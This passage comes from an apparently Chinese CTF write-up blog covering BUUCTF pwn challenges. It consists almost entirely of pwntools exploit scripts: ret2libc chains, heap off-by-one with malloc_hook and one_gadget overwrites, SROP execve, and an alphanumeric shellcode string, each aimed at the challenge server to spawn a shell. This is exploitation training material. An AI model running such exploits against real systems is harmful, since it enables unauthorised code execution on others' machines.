data-num=\"37\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">headchunk</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> dest<span class=\"token punctuation\">,</span> size<span class=\"token operator\">=</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        self<span class=\"token punctuation\">.</span>dest <span class=\"token operator\">=</span> dest</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        self<span class=\"token punctuation\">.</span>size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">out</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>self<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">,</span>self<span class=\"token punctuation\">.</span>dest<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">return</span> payload</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>puts_4 <span class=\"token operator\">=</span> <span class=\"token number\">0x804862B</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">25186</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'uc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>puts_4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    mainarena_48 <span class=\"token operator\">=</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    mh_a <span class=\"token operator\">=</span> mainarena_48 <span class=\"token operator\">-</span> <span class=\"token number\">0x48</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] the address of malloc hook is:%#x'</span><span class=\"token operator\">%</span>mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span> mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token number\">0xc</span><span class=\"token punctuation\">,</span> p32<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b';sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"jarvisoj_level5\"><a class=\"markdownIt-Anchor\" href=\"#jarvisoj_level5\">#</a> jarvisoj_level5</h2>\n<p>ret2libc</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'level3_x64'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./\"</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26721</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>write_p<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'write'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x080</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x04006b3</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x04006b1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x0400499</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rsi_r15<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>write_p<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Input:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>payload <span class=\"token operator\">=</span> offset <span class=\"token operator\">*</span> <span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>bs_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>main_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"roarctf_2019_easy_pwn\"><a class=\"markdownIt-Anchor\" href=\"#roarctf_2019_easy_pwn\">#</a> roarctf_2019_easy_pwn</h2>\n<p>off by one, malloc hook,</p>\n<p>最后直接将 malloc_hook 设为 one_gadget，不符合条件。选择利用 realloc 跳板。直接成功了，所以没有再去计算。</p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\nfrom LibcSearcher import LibcSearcher\ncontext(arch='amd64', log_level='debug')\n\nfilename = 'roarctf_2019_easy_pwn'\nlibcfile = '/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'\nlibc = ELF(libcfile)\n\nmode = int(sys.argv[1]) if len(sys.argv)&gt;1 else 0\np = process('./'+filename+'_pe') if mode else remote('node4.buuoj.cn',28961)\ne = ELF('./'+filename+'_pe') if mode else ELF('./'+filename)\n\nif mode==2:\n    gdb.attach(p, 'b *$rebase(0x121C)')\n    \ndef suspend():\n    if mode == 2:\n        pause()\n    else:\n        sleep(0.1)\n\ndef choose(x):\n    p.sendlineafter(b'choice: ', str(x).encode())\n    \ndef mal(size):\n    choose(1)\n    p.sendlineafter(b'size: ', str(size).encode())\ndef free(index):\n    choose(3)\n    p.sendlineafter(b'index: ', str(index).encode())\ndef edit(index, size, content):\n    choose(2)\n    p.sendlineafter(b'index: ', str(index).encode())\n    p.sendlineafter(b'size: ', str(size).encode())\n    p.sendafter(b'content: ', content)\ndef dump(index):\n    choose(4)\n    p.sendlineafter(b'index: ', str(index).encode())\n    p.recvuntil(b'content: ')\n\n\nclass headchunk():\n    def __init__(self, dest, size=0x28):\n        self.dest = dest\n        self.size = size\n    def out(self):\n        payload = flat([self.size,self.dest])\n        return payload\n\n\naddrArr = 0x202048\nc3 = addrArr + 0x8*3\n\nmal(0x18)\nmal(0x18)\nmal(0x18)\nmal(0x78) #3\nmal(0x18)\n\nedit(0, 0x18+10, b'a'*0x18 + b'\\x41')\nfree(1)\nmal(0x38) #1\n\npayload = b'a'*0x18 + p64(0xa1)\nedit(1,len(payload), payload)\nfree(2)\ndump(1)\np.recvuntil(p64(0xa1))\nma_ = u64(p.recv(8))\nmh_a = ma_ - 0x68\nprint('[+] the address of mh is:%#x'%mh_a)\nobj = LibcSearcher('__malloc_hook', mh_a)\n\nlibcbase = mh_a - obj.dump('__malloc_hook')\nrealloc_a = libcbase + obj.dump('realloc')\noneg = 0x4526a\noneg += libcbase\nfakeadd = mh_a - 0x23\nfakechunk = b'a'*0xb + p64(oneg) + p64(realloc_a)\n\nmal(0x68) #2\n\nfree(2) \npayload = b'a'*0x18 + p64(0x71) + p64(fakeadd)\nedit(1, len(payload), payload)\nmal(0x68) #2\nmal(0x68) #5 -&gt; fakechunk\nedit(5, len(fakechunk), fakechunk)\nmal(1)\np.interactive()\n</code></pre>\n<h2 id=\"ciscn_2019_es_7\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_es_7\">#</a> ciscn_2019_es_7</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ciscn_2019_es_7'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./ciscn_2019_es_7')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28769</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b main')</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x010</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>csu_front_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x0400580</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>csu_end_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x040059A</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token number\">0x601000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>gad <span class=\"token operator\">=</span> <span class=\"token number\">0x4004D6</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400517</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4005a3</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x4005a1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rax0f <span class=\"token operator\">=</span> <span class=\"token number\">0x4004da</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_read</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x400</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload <span class=\"token operator\">=</span>  <span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rax0f<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\"># execv(\"/bin/sh\",0,0)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sigframe <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> buf <span class=\"token operator\">+</span> <span class=\"token number\">0x120</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rsp <span class=\"token operator\">=</span> buf</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sigframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>rax0f<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>sigframe<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">0x120</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x120</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"mrctf2020_shellcode_revenge\"><a class=\"markdownIt-Anchor\" href=\"#mrctf2020_shellcode_revenge\">#</a> mrctf2020_shellcode_revenge</h2>\n<p>61-7a</p>\n<p>41-5a</p>\n<p>30-5a</p>\n<p>alpha</p>\n<pre><code>#!/usr/bin/python3\nfrom pwn import *\n#p=process('./mrctf2020_shellcode_revenge')\np=remote('node4.buuoj.cn',29553)\n\npayload = b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'\n\np.send(payload)\np.interactive()\n</code></pre>\n<h2 id=\"cmcc_pwnme2\"><a class=\"markdownIt-Anchor\" href=\"#cmcc_pwnme2\">#</a> cmcc_pwnme2</h2>\n<p>ret2libc</p>\n<p>系统有给 orw 的漏洞，但我没去利用。</p>\n<p>在子函数里即可直接栈溢出。因为是 32 位程序，不需要担心地址的 <code>'\\0'</code>  让 strcpy 截断。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'pwnme2'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_i386/libc/lib/i386-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token 